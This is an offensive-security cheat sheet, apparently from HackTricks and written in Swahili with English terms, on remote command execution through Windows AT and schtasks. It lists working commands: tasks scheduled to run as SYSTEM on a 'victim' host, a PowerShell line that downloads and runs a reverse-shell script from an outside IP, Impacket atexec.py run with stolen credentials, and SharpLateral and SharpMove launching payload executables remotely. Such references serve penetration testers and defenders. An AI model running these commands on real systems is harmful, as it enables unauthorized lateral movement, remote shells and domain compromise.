# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Inafanyaje kazi

At inaruhusu kupanga tasks kwenye hosts ambako unajua username/(password/Hash). Kwa hivyo, unaweza kuitumia kutekeleza commands kwenye hosts nyingine na kupata output.
```
At \\victim 11:00:00PM shutdown -r
```
Kwa kutumia schtasks, kwanza unahitaji kuunda task kisha kuiendesha:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Unaweza kutumia **`atexec.py` ya Impacket** kutekeleza commands kwenye systems za remote kwa kutumia AT command. Hii inahitaji credentials halali (username na password au hash) za target system.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Unaweza pia kutumia [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Unaweza kutumia [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Maelezo zaidi kuhusu [**matumizi ya schtasks na silver tickets hapa**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
